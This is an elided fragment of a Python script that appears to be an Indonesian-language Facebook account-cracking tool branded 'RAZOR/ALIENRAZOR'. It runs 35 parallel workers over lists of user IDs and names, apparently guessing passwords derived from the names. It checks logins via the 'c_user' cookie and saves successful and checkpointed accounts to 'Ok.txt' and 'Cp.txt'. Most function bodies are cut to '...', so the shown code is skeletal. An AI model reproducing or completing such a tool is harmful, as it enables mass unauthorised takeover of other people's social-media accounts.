...
def ___menu___():
    ...
    try:
        ...
        exit("%s[%s!%s]%s RAZOR Error" % (K, P, K, P))
    ...
    if ___pilih in ['1', '01']:
        ...
        print("%s[%s!%s]%s RAZOR Token" % (K, P, K, P));
        os.system('rm -rf login.txt');
        exit()
    else:
        exit("%s[%s!%s]%s Wrong Input" % (M, P, M, P))
...
def ___acak___():
    ...
    try:
        ...
        print("%s[%s?%s]%s File ALIENRAZOR Di :%s %s\n" % (H, P, H, P, K, '/sdcard/' + ___file))
    ...
    if ___cek in ['y', 'Y']:
        ...
        with ThreadPoolExecutor(max_workers=35) as (___hayuk):
            try:
                ...
                exit("%s[%s!%s]%s File Tidak Ada" % (M, P, M, P))
            print("\n%s[%s•%s]%s RAZOR Ok ALIENRAZOR Di Results/Ok.txt" % (H, P, H, P))
            print("%s[%s•%s]%s RAZOR Cp ALIENRAZOR Di Results/Cp.txt\n" % (H, P, H, P))
            for ___user in ___files:
                uid, name = ___user.split('|')
                z = name.split(' ')
...
def ___api___(total, uid, pwx):
    ...
    try:
        ...
        sys.stdout.write(
            "\r\x1b[1;93m[\x1b[1;97m!\x1b[1;93m]\x1b[1;97m RAZOR Error                "
        );
        sys.stdout.flush();
        sleep(7)
...
def ___opsi___():
    ...
    try:
        ...
        exit("%s[%s!%s]%s File Tidak Ada" % (M, P, M, P))
    print("%s[%s?%s]%s Total RAZOR :%s %s" % (B, P, B, P, H, len(___files)))
    print("\n%s[%s•%s]%s RAZOR Ok ALIENRAZOR Di Opsi/Ok.txt" % (H, P, H, P))
    print("%s[%s•%s]%s RAZOR Cp ALIENRAZOR Di Opsi/Cp.txt\n" % (H, P, H, P))
...
def ___start___(user, pasw):
    ...
    if "c_user" in ses.cookies:
        ...
        print(" \x1b[1;92m[\x1b[1;97m*\x1b[1;92m]\x1b[1;97m ALIENRAZOR :\x1b[1;92m " + str(len(xe)))
        num = 0
        for _ in xe:
            num += 1
            print(
